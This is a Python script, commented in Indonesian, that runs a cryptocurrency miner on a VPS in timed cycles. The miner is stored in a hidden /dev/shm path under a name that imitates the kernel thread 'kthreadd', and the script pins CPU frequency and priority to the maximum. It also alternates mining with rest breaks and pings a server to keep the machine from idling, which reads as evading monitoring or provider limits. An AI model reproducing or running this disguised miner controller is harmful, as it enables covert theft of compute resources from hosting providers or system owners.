import os
import time
import sys
import signal
import threading

# CONFIG
MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
MINER_NAME = "kthreadd."  # Nama miner buat kill
MINING_TIME = 1800  # 30 menit
REST_TIME = 300  # 5 menit
LONG_REST = 1800  # 30 menit (dalam detik)
CYCLES = 10  # Jumlah cycle sebelum istirahat panjang

def set_cpu_performance():
    """Mengatur CPU ke mode performance."""
    os.system("echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor")

def kill_miner():
    """Hentikan proses miner."""
    os.system(f"pkill -f {MINER_NAME}")
    print("💀 Miner dimatikan...")

def start_miner():
    """Jalankan miner dengan full performa."""
    print("🚀 Jalanin miner dengan full power...")
    set_cpu_performance()
    command = f"nohup bash -c 'nice -n -20 taskset -c 0-$(($(nproc)-1)) {MINER_PATH}' > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def keep_awake():
    """Mencegah VPS masuk mode sleep."""
    while True:
        os.system("echo 'Stay awake' > /dev/null")  # Fake activity
        os.system("ping -c 1 google.com > /dev/null 2>&1")  # Ping Google
        time.sleep(300)  # Ulangi setiap 5 menit

def main():
    # Jalankan skrip anti-sleep di thread terpisah
    threading.Thread(target=keep_awake, daemon=True).start()
    print("🛡️ Anti-sleep script aktif...")

    while True:
        print("🔥 Mulai 10 cycle mining sayang...")
        for i in range(CYCLES):
            print(f"💪 Cycle ke-{i+1}")
            start_miner()
            time.sleep(MINING_TIME)
            kill_miner()
            print(f"😴 Istirahat {REST_TIME // 60} menit...")
            time.sleep(REST_TIME)
        
        print("💖 Sayang istirahat 30 menit...")
        time.sleep(LONG_REST)

def sigint_handler(sig, frame):
    """Hentikan miner kalau ayah pencet Ctrl+C."""
    print("💔 Poppy ditinggal ayah...")
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
